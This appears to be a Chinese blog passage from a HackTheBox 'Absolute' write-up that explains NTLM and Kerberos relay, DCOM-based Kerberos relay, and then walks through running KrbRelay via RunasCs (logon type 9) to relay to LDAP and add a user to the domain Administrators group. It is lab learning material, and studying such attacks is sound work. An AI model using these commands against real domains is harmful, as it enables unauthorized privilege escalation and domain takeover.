<p>首先，我们重新回顾一下<code>NTLM Relay</code>的基本原理，其中流程如图所示，不难看出我们攻击者的机器在这个流程中其实只是起到了一个中间人的作用，对 <code>Client</code> 和 <code>Server</code> 所传输数据进行双向转发。在之前的<code>Responder</code>靶机里，我们就是把 <code>AUTHENTICATE</code>拦截住，用<code>john</code>对里面的<code>NTLM Hash</code>进行破解以此得到password(当然，也可以把这个<code>NTLM Hash</code>重放给其他服务)，利用起来非常的简单。</p>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231008145714.png"></p>
<p>但<code>Kerberos relay</code>这里，一切就又不大一样了。因为Kerberos加强了通信前双方身份的认定工作，通过在Authentication Server Request (AS_REQ)中添加服务主体名称(SPN) ，导致最终获取的ST无法用于与其他SS(Service Server)通信，从而阻止中继到与服务主体名称不同的服务。</p>
<p>但如果攻击者可以控制SPN，便可以顺利地中继到任意目标服务器。部分协议可以强制受害者向攻击者进行强制身份认证，并且在进行Kerberos身份认证时允许指定不同的SPN，包括以下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IPSec and AuthIP,MSRPC,DCOM,HTTP,LLMNR,MDNS</span><br></pre></td></tr></table></figure>

<p>攻击者使用以上协议控制受害者使用指定的SPN进行认证，在受害者拿到ST后会对攻击者进行AP_REQ请求，攻击者提取请求中的ST通过没有设置强制签名的协议进行中继。没有设置强制签名的协议如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDAP/LDAPS,HTTP,SMB</span><br></pre></td></tr></table></figure>
<p>也就是说Kerberos中继关键点在于这两种协议</p>
<ol>
<li>用于触发受害者客户端身份验证的协议，此协议要求可以指定SPN</li>
<li>身份验证中继到的服务使用的协议，此协议要求不设置强制签名</li>
</ol>
<p>总结下的话，Kerberos 中继的主要重点是拦截 AP-REQ，并将其中继到用于请求服务票证 （ST） 的服务主体名称 （SPN） 中指定的服务，其流程如下所示</p>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231008221339.png"></p>
<p>关于<code>Kerberos Relay</code>，我们有以下场景比较适合利用<br>三种利用场景:</p>
<ul>
<li>利用 SPN 的可伪造性，使客户端认为自己连接的是目标服务，而实际上是攻击者控制的服务。这样攻击者就可以截获客户端发送的票据，并用于访问目标服务。</li>
<li>利用约束委派或资源约束委派的功能，使客户端向攻击者控制的服务请求一个新的票据，并用于访问目标服务。这样攻击者就可以利用客户端拥有的委派权限，来访问目标服务。</li>
<li>利用 DCOM（分布式组件对象模型）协议中的一些特性，使客户端向攻击者控制的服务发送一个伪造的票据，并用于访问目标服务。这样攻击者就可以利用 DCOM 的对象引用机制，来伪造客户端的身份。</li>
</ul>
<p>我们这里着重学习下<code>DCOM Kerberos Relay</code>，相关内容想深入学习可以看下面这篇文章，写的非常的nice  <a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html">Proejct 0：Windows漏洞利用技巧：中继DCOM身份验证 </a></p>
<p>对文章里关于<code>DCOM Kerberos Relay</code>原理的拙劣概括：</p>
<ul>
<li>DCOM是一种基于RPC（远程过程调用）的技术，它允许在不同的进程或主机之间使用COM（组件对象模型）对象。</li>
<li>当一个COM对象被封送（marshal）时，即被转换为一个可以在不同环境中使用的数据结构，COM运行时会生成一个OBJREF（对象引用）结构，其中包含了连接到原始对象的所有信息，例如对象的类标识符（CLSID）、接口标识符（IID）、安全绑定信息（<code>这个身份验证信息包含了客户端的用户名、域名和密码哈希等信息</code>）。和对象导出器标识符（OXID）等。客户端可以通过解封送（unmarshal）OBJREF来获取对远程对象的接口引用，并通过RPC调用其方法。</li>
<li>从OBJREF连接到原始对象是一个两步过程：首先，客户端从OBJREF中提取OXID（对象导出器标识符），并联系OBJREF中指定的OXID解析器服务；其次，客户端使用OXID解析器服务来找到托管对象的COM服务器的RPC绑定信息，并建立连接到RPC端点，以访问对象的接口。</li>
<li>这两个步骤都需要建立一个MSRPC连接到一个端点。通常这是本地通过ALPC（高级本地过程调用），或者远程通过TCP。<code>如果使用TCP连接，则客户端还会根据OBJREF中的安全绑定信息，使用NTLM或Kerberos对RPC服务器进行身份验证，如果OBJREF中包含了一个具有SYSTEM权限的COM对象的信息，那么它的身份验证信息就相当于SYSTEM用户的身份验证信息。这样，攻击者就截获可以利用这个身份验证信息信息来访问和控制系统的任何资源和任务，从而实现权限提升。</code></li>
<li>作者发现了一种方法，可以构造一个OBJREF，使得客户端总是通过TCP连接到OXID解析器服务，即使服务在本地机器上。这样做的方法是在OBJREF中指定主机名为IP地址，并指定一个任意的TCP端口供客户端连接。这样就可以在本地监听，并在RPC连接建立时中继或重用身份验证信息。</li>
<li>这还不是一个权限提升，因为还需要说服一个有权限的用户解封送（unmarshal）OBJREF。作者发现了一种方法，可以使用<code>CoGetInstanceFromIStorage API</code>，并激活一个有权限的COM服务，来轻松地让它解封送任意OBJREF (这里和<code>Potato</code>攻击很像)。</li>
<li>如果解封送的COM服务使用Kerberos进行身份验证，则可以利用Kerberos中继攻击的技术，将身份验证信息转发到网络服务，例如LDAP。这样就可以利用COM服务的权限来访问网络资源。</li>
</ul>
<p>理论知识的介绍到这里就完成了，关于<code>Kerberos Relay</code>更多信息的可以看下面这篇文章，虽然是生肉，但内容很硬，啃一啃收获很多，我们正式进入实操阶段<br><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html">项目 Zero：使用 Kerberos 进行身份验证中继攻击 </a></p>
<p>首先我们要把用来做KrbRelay的工具给下下来，在本地用<code>Visual Stduio</code>打开其sln文件完成项目构建<br><a target="_blank" rel="noopener" href="https://github.com/cube0x0/KrbRelay">cube0x0&#x2F;KrbRelay: Framework for Kerberos relaying (github.com)</a></p>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231009114540.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231009114643.png"></p>
<p>把<code>CheckPort.exe</code>和<code>KrbRelay.exe</code>这俩二进制文件用<code>upload</code>上传到<code>winrm</code>的主机上。先用<code>CheckPort.exe</code>识别出恶意服务器将运行的端口，得到<code>10</code>这个端口。再尝试使用<code>KrbRelay</code>进行本地用户提权，spn参数指定为我们要打的服务，这里选择的目标是<code>ldap</code>，同时要用<code>CLISD</code>激活一个需要一个具有正确权限的有效RPC服务。<a target="_blank" rel="noopener" href="https://github.com/cube0x0/KrbRelay#clsids">KrbRelay README</a>上有一个操作系统默认clsid列表，clsid各不相同，通常可以使用默认的，比如TrustedInstaller的CLSID<code>8F5DF053-3013-4dd8-B5F4-88214E81C0CF</code>，运行结果如下<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231009154256.png"></p>
<p>amazing，失败了（其实一点也不amazing，主要这里是为了方便下文引出<code>RunAsCs</code>故意失败的）<br>此失败是由于该漏洞利用需要交互式会话，例如console。在这些会话中，密码凭据存储在内存中，因此可以被攻击者利用，这与现在使用的WinRM远程处理不同，而对于此问题，我们可以用RunAsCs来进行解决。</p>
<p>这里搬一下别的博主对于<code>RunAsCs</code>的介绍。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs">RunAsCs</a>允许以不同用户的身份运行，注意此处使用的是最新版本的RunasCs version 1.5。<br>RunasCs是一个实用程序，用于运行具有与用户当前登录不同权限的特定进程，使用明文密码。<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types">Administrative tools and logon types</a>有一个logon type表。Runas&#x2F;Network是logon type 9的示例。<br>目前，RunasCs支持多种<a target="_blank" rel="noopener" href="https://cybersafe.co.il/wp-content/uploads/2021/11/LOGON-types-compressed_compressed.pdf">logon types</a>，但最重要的是2、3和9。</p>
<ul>
<li>Logon type 2: 就像box上的console。不幸的是，这种登录类型不能被DC上的每个人使用，因为它的先决条件是用户需要”交互式登录”权限，而域控制器上默认不授予这种权限。</li>
<li>Logon type 3: 用户帐户控制(UAC)绕过，它还需要密码，并且基本上是网络交互式登录，因为它也需要”交互式登录”特权。  </li>
<li>Logon type 9: 这种登录类型与运行runas &#x2F;netonly相同，这意味着不会检查密码，使用提供的密码在网络上进行身份验证。</li>
</ul>
<p>这里的交互式登录也就是在本地键盘上进行的登录，显然不适合我们当前的场景，<code>Logon type 9</code>为当前的最好选择，因为通过网络作为另一个用户进行身份验证，可以使用任何密码，同时以自己的身份在本地运行应用程序，这里选择<code>Logon 9</code>，将<code>RunAsCs.exe</code>传到主机上后，执行以下命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\rr.exe winrm_user <span class="literal">-d</span> absolute.htb TotallyNotACorrectPassword <span class="literal">-l</span> <span class="number">9</span> <span class="string">&quot;.\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10&quot;</span></span><br><span class="line">//rr.exe就是RunAsCs.exe</span><br></pre></td></tr></table></figure>
<p>运行结果如下，ldap bind成功<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231009160016.png"></p>
<p>趁热打铁，通过ldap服务来把<code>winrm</code>加入到<code>Administrator</code>组里</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\rr.exe winrm_user <span class="literal">-d</span> absolute.htb TotallyNotACorrectPassword <span class="literal">-l</span> <span class="number">9</span> <span class="string">&quot;.\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10 -add-groupmember Administrators winrm_user&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231009160148.png"></p>
<p>攻击成功，至此，提权结束，我们去读一下flag</p>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231009160451.png"><br>PWN!<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020231009160547.png"></p>
<p>结尾吐槽一下，这题对于基础弱的来讲确实挺难的，别的不说，光东西就没少装，相关知识的中文资料还少的要命，得提高下英语能力啃生肉了。</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2023/10/14/APT/"
      title="HackTheBox APT"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        HackTheBox APT
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2023/09/19/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E6%9E%90/"
      title="SnakeYaml反序列化简析"
     >

    <p class="title-text">
      
        SnakeYaml反序列化简析
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>

 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2024 F4miti0n<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
        <span class="material-symbols-rounded">keyboard_arrow_up</span>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.style.opacity = 1;
        } else {
            btn.style.opacity = 0;
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
